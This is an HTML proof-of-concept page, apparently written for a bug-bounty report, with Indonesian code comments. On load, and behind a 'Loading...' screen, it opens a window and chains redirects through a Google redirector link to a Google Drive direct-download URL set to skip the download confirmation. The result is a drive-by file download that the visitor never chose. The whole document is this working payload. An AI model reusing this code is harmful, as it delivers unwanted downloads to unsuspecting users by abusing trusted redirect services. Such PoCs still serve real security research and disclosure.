<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirect PoC</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        console.log("Redirecting to:", urls[index]);

        w.location.replace(urls[index]);

        // stop kalau sudah terakhir
        if (index === urls.length - 1) return;

        setTimeout(() => {
          chainRedirect(w, urls, index + 1);
        }, 1500); // diperbesar biar stabil
      }
    }

    function startRedirect() {
      let w = window.open("about:blank");

      setTimeout(() => {
        chainRedirect(w, [
          "https://www.google.com/url?q=https%3A%2F%2Fhackerone.com&sa=D&sntz=1&usg=AOvVaw3CTxmzYnpf1VJr1JanEryl",

          // pakai link lebih stabil
          "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768"
        ]);
      }, 500);
    }
  </script>
</head>

<body onload="startRedirect()">
  <h3>Loading...</h3>
</body>
</html>
